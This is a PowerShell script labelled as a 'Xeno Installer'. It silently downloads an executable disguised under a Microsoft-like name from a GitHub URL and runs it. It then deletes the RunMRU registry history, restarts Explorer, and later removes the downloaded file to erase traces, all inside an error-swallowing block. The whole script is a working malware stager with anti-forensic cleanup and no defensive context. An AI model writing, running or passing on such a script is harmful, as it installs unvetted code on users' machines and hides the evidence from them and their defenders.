# Silent Runner - Xeno Installer
$payloadUrl = "https://github.com/hypnotixx0/xenolord/raw/main/MicrosoftDllHandler.exe"
$payloadPath = "$env:USERPROFILE\Downloads\MicrosoftDllHandler.exe"

try {
    # Download the file
    $webClient = New-Object System.Net.WebClient
    $webClient.DownloadFile($payloadUrl, $payloadPath)
    $webClient.Dispose()
    
    Start-Sleep -Seconds 3
    
    $serverSize = (Invoke-WebRequest -Uri $payloadUrl -Method Head -UseBasicParsing).Headers['Content-Length']
    $localSize = (Get-Item $payloadPath).Length
    
    while ($localSize -ne $serverSize) {
        Start-Sleep -Seconds 1
        $localSize = (Get-Item $payloadPath).Length
    }
    
    Start-Sleep -Seconds 2
    
    Start-Process -FilePath $payloadPath
    
    # Nuke RunMRU and restart Explorer to clear it
    Remove-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Recurse -Force -ErrorAction SilentlyContinue
    Stop-Process -Name explorer -Force
    Start-Process explorer
    
    Start-Sleep -Seconds 300
    Remove-Item -Path $payloadPath -Force -ErrorAction SilentlyContinue
} catch {}
